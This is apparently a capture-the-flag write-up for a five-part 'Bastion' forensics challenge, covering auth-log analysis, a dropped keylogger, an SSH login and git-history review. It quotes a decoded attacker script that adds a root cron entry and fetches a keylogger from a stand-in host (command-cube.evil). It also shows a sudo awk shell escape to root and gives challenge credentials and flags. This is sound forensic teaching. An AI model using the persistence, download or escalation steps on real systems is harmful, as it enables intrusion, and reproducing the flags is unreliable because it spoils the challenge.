# Bastion

## \[★☆☆\] So much just from logs

### Description

A routine inspection of authentication logs reveals an overwhelming pattern of suspicious access attempts to a dockized SSH bastion server. Inspect the logs and look for any unordinary activity.

[part1_toolbox_logs.tar.gz](https://ctf-world.cybergame.sk/files/49436a39aa5a9ea2f3fc2c36a53edaad/part1_toolbox_logs.tar.gz?token=eyJ1c2VyX2lkIjoyOTQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI3fQ.aD3HBA.c7UM3puVHrOSjGtPC35o_CZYk5g)

### Solution

Files
```powershell
➜ 7z x .\part1_toolbox_logs.tar.gz^C
➜ 7z l .\part1_toolbox_logs.tar   
   Date      Time    Attr         Size   Compressed  Name
------------------- ----- ------------ ------------  ------------------------
2025-04-18 19:38:41 D....            0            0  log
2025-04-18 19:38:49 .....         8512         8704  log\auth.log
2025-04-18 19:38:41 .....       592045       592384  log\auth.log.1
2025-04-18 19:37:41 .....        37476        37888  log\auth.log.2.gz
2025-04-18 19:36:41 .....        37057        37376  log\auth.log.3.gz
2025-04-18 19:35:41 .....        37216        37376  log\auth.log.4.gz
2025-04-18 19:34:40 .....        38972        39424  log\auth.log.5.gz
2025-04-18 19:33:37 .....            0            0  log\error.log
2025-04-18 19:33:37 .....            0            0  log\kern.log
2025-04-18 19:33:37 .....            0            0  log\mail.log
------------------- ----- ------------ ------------  ------------------------
2025-04-18 19:38:49             751278       753152  9 files, 1 folders
```

Cleanup
```bash
└─$ gzip -d auth.log.*.gz
└─$ find . -empty -delete
```

Ideally we want to know what was ran by malicious actor, search for `COMMAND` in SSH logs
```bash
└─$ grep COMMAND . -Rn
./auth.log.4:676:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/hostname
./auth.log.4:677:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/sbin/ip a
./auth.log.4:678:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/cat /etc/passwd
./auth.log.4:680:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/base64 -d
./auth.log.4:681:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo IyEvYmluL3NoCmJlYWNvbj0iNjkyMDY4NmY3MDY1MjA3NDY4NjU3OTIwNzc2ZjZlNzQyMDY2Njk2ZTY0MjA2ZDY1MmMyMDYxNmU2NDIwNzQ2ODY5NzMyMDY2NmM2MTY3MjAyODUzNGIyZDQzNDU1MjU0N2I2ZTMzNzYzMzcyNWY2NjMwNzIzNjMzMzc1ZjM0NjIzMDc1Mzc1ZjY0MzQzNzVmNzAzMzcyMzUzMTM1MzczMzZlNjMzMzdkMjkyMDZiNjU2NTcwNzMyMDZmNmUyMDYyNjU2MTYzNmY2ZTY5NmU2NyIKZWNobyAiWyQoZGF0ZSldICQoZWNobyAkYmVhY29uIHwgeHhkIC1yIC1wKSIgPiAvdG1wL3BlcnNpc3RlbmNlCm1rZGlyIC1wIC92YXIvZGF0YQp3Z2V0IC1PIC92YXIvZGF0YS9rZXlsb2dnZXIuYmluICJodHRwOi8vY29tbWFuZC1jdWJlLmV2aWwva2V5bG9nZ2VyLmJpbiIK
./auth.log.4:682:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/usr/bin/tee /usr/local/bin/insider.sh
./auth.log.4:684:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/usr/bin/tee -a /etc/crontabs/root
./auth.log.4:685:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo '0 * * * * /usr/local/bin/insider.sh'
./auth.log.4:696:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/sh /usr/local/bin/insider.sh
./auth.log.4:697:Apr 18 15:34:49 a952d0d9ca03 sudo:  ratchet : PWD=/home/ratchet ; USER=root ; COMMAND=/bin/echo DONE
```

Decode base64 payload
```bash
└─$ echo IyEvYmluL3NoCmJlYWNvbj0iNjkyMDY4NmY3MDY1MjA3NDY4NjU3OTIwNzc2ZjZlNzQyMDY2Njk2ZTY0MjA2ZDY1MmMyMDYxNmU2NDIwNzQ2ODY5NzMyMDY2NmM2MTY3MjAyODUzNGIyZDQzNDU1MjU0N2I2ZTMzNzYzMzcyNWY2NjMwNzIzNjMzMzc1ZjM0NjIzMDc1Mzc1ZjY0MzQzNzVmNzAzMzcyMzUzMTM1MzczMzZlNjMzMzdkMjkyMDZiNjU2NTcwNzMyMDZmNmUyMDYyNjU2MTYzNmY2ZTY5NmU2NyIKZWNobyAiWyQoZGF0ZSldICQoZWNobyAkYmVhY29uIHwgeHhkIC1yIC1wKSIgPiAvdG1wL3BlcnNpc3RlbmNlCm1rZGlyIC1wIC92YXIvZGF0YQp3Z2V0IC1PIC92YXIvZGF0YS9rZXlsb2dnZXIuYmluICJodHRwOi8vY29tbWFuZC1jdWJlLmV2aWwva2V5bG9nZ2VyLmJpbiIK | base64 -d
#!/bin/sh
beacon="6920686f7065207468657920776f6e742066696e64206d652c20616e64207468697320666c61672028534b2d434552547b6e337633725f6630723633375f34623075375f6434375f70337235313537336e63337d29206b65657073206f6e20626561636f6e696e67"
echo "[$(date)] $(echo $beacon | xxd -r -p)" > /tmp/persistence
mkdir -p /var/data
wget -O /var/data/keylogger.bin "http://command-cube.evil/keylogger.bin"
```

Decode hex:
```bash
└─$ echo 6920686f7065207468657920776f6e742066696e64206d652c20616e64207468697320666c61672028534b2d434552547b6e337633725f6630723633375f34623075375f6434375f70337235313537336e63337d29206b65657073206f6e20626561636f6e696e67 | xxd -r -p
i hope they wont find me, and this flag (SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}) keeps on beaconing 
```

> Flag: `SK-CERT{n3v3r_f0r637_4b0u7_d47_p3r51573nc3}`

## \[★☆☆\] Inspect the file system

### Description

Based on your findings, continue your analysis with the docker layer of the docker container.

[part2_docker_layer.tar.gz](https://ctf-world.cybergame.sk/files/c3001fc0a80fbed65e54847f87e4b764/part2_docker_layer.tar.gz?token=eyJ1c2VyX2lkIjoyOTQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI5fQ.aD3JVA.O1fOgH850xhoAm-4z0HKFAYeHIs)

### Solution

Extract and cleanup~
```bash
└─$ 7z x part2_docker_layer.tar.gz
└─$ 7z x part2_docker_layer.tar
└─$ find . \( -size 0 -o -size 31 \) -delete # Empty and busybox
```

Malicious actor dropped this file from previous SSH inspection
```bash
└─$ find . -name keylogger.bin -ls
      842     20 -rw-r--r--   1 woyag    woyag       16600 Apr 19 09:23 ./merged/var/data/keylogger.bin
      894     20 -rw-r--r--   1 woyag    woyag       16600 Apr 19 09:23 ./diff/var/data/keylogger.bin
└─$ file ./merged/var/data/keylogger.bin
./merged/var/data/keylogger.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6332d38dc9be76690894dc29b5dff65e14d10661, for GNU/Linux 3.2.0, not stripped

└─$ file ./diff/var/data/keylogger.bin
./diff/var/data/keylogger.bin: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6332d38dc9be76690894dc29b5dff65e14d10661, for GNU/Linux 3.2.0, not stripped
```

[Quick inspection](https://dogbolt.org/?id=9866861c-0a07-42f1-ac4a-5dbdc609d199) gives the flag in plain text

![Bastion.png](/assets/ctf/cybergame/bastion.png)

or just
```bash
└─$ strings ./diff/var/data/keylogger.bin | grep CERT
=== LOG START SK-CERT{l34v3_17_70_7h3_pr05} ===
```

> Flag: `SK-CERT{l34v3_17_70_7h3_pr05}`

## \[★☆☆\] Clean bastion

### Description

The keylogger binary was passed to a malware analyst. Regarding the server, no further changes were detected, so the container was rebuilt and redeployed to a test environment. Ssh to the system. 

WARNING: be aware that the system is running as a single container for all CTF players, so behave.

`ssh://exp.cybergame.sk:7009 (ratchet:23ekmnjr4bh5tgvfhbejncidj)`

### Solution

We get the flag right after we login (?)
```bash
└─$ sshpass -p 23ekmnjr4bh5tgvfhbejncidj ssh exp.cybergame.sk -p 7009 -l ratchet
Warning: Permanently added '[exp.cybergame.sk]:7009' (ED25519) to the list of known hosts.
Welcome, Ratchet!
Come in and dont be shy

     SK-CERT{bru73_f0rc1n6_u53r5_w0rk5}

3f35af04c9ab:/home/ratchet$ id
uid=1000(ratchet) gid=1000(ratchet) groups=10(wheel),1000(ratchet)
```

> Flag: `SK-CERT{bru73_f0rc1n6_u53r5_w0rk5}`

## \[★☆☆\] Feel free to dig in

### Description

Inside the quarantined system, dig in and search for any remnants or traces of the attackers.

`ssh://exp.cybergame.sk:7009`

### Solution

We are part of group `wheel` which is tied to `sudo` and after checking our capabilities we have unrestricted access. But `su` binary doesn't exist in container.
```bash
3f35af04c9ab:/home/ratchet$ sudo -l
User ratchet may run the following commands on 3f35af04c9ab:
    (ALL) NOPASSWD: ALL
3f35af04c9ab:/home/ratchet$ sudo su
ash: applet not found
3f35af04c9ab:/home/ratchet$ busybox --list
...
```

Find any binary to escalate privileges, like awk: [https://gtfobins.github.io/gtfobins/awk/](https://gtfobins.github.io/gtfobins/awk/)
```bash
3f35af04c9ab:/home/ratchet$ sudo awk 'BEGIN {system("/bin/sh")}'
/home/ratchet # id
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
```

I thought this would be harder and then I started thinking simpler:
```bash
/home/ratchet # find -L
.
./.ssh
./.ssh/authorized_keys
/home/ratchet # cat ./.ssh/authorized_keys
ecdsa-sha2-nistp256 AAAAvZHODysGbxHo1wGtqbqi1Ffnr2li7j8ov/V26Nt4w/HR26mWOtT/APG1qBilJoVmCQChz/hCWuIWwzqqZNe1BQ== ratchet@infocube
ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOSeOZtJmXS7zliVg5tEaEk9KvhIRn4S3FBjLuo1s0eUvHi6HkzuLTNXiphR8Lth/DWQNeC/A+meex8Y09RtZQA= hacker-U0stQ0VSVHtoMEx5X00wTGx5X1RIM3lfNHIzXzV0aUxsX2gzUjN9
/home/ratchet # echo 'U0stQ0VSVHtoMEx5X00wTGx5X1RIM3lfNHIzXzV0aUxsX2gzUjN9' | base64 -d; echo
SK-CERT{h0Ly_M0Lly_TH3y_4r3_5tiLl_h3R3}
```

> Flag: `SK-CERT{h0Ly_M0Lly_TH3y_4r3_5tiLl_h3R3}`

## \[★☆☆\] The backdoor culprit

### Description

Explore the source git repository for the bastion server docker deployment and look for the source of the dropped backdoor.

[part5_ssh-bastion-repo.tar.gz](https://ctf-world.cybergame.sk/files/ca2c3d3b671035325f87cc1fe537cec7/part5_ssh-bastion-repo.tar.gz?token=eyJ1c2VyX2lkIjoyOTQsInRlYW1faWQiOm51bGwsImZpbGVfaWQiOjI4fQ.aD3QJw.83eLrbkRi75mcCn_WZ3BSE8FDLQ)

### Solution

```bash
└─$ ls -alh
Permissions Size User Date Modified Name
drwxrwx---     - root 19 Apr 09:05   .git
.rwxrwx---   164 root 19 Apr 09:05   docker-compose.yml
.rwxrwx---  1.2k root 18 Apr 17:40   Dockerfile
.rwxrwx---    24 root 18 Apr 15:26   issue.admin
.rwxrwx---    42 root 18 Apr 15:26   issue.generic
.rwxrwx---    18 root 18 Apr 15:26   issue.ratchet
.rwxrwx---    66 root 18 Apr 15:29   motd
.rwxrwx---   218 root 19 Apr 09:05   README.md
.rwxrwx---   233 root 18 Apr 15:31   sshd_config
```

```bash
└─$ git log --oneline --graph | cat -
* 434e557 merge suggested changes from colleague
* fe00ee7 upgrade base image
* 018ab72 harden user passwords
* 3f9744d bastion deployment. initial commit
```

Nothing from commit history which catches eye...
```bash
└─$ LESS=-R git log -p
```

```bash
└─$ git --no-pager branch
* main
  suggested_changes
└─$ git checkout suggested_changes -f
Switched to branch 'suggested_changes'
└─$ git log --oneline --graph | cat -
* a222654 update ssh keys SK-CERT{r09U3_3MPL0Y33_0r_5uPpLycH41n}
* fe00ee7 upgrade base image
* 018ab72 harden user passwords
* 3f9744d bastion deployment. initial commit
```

> Flag: `SK-CERT{r09U3_3MPL0Y33_0r_5uPpLycH41n}`

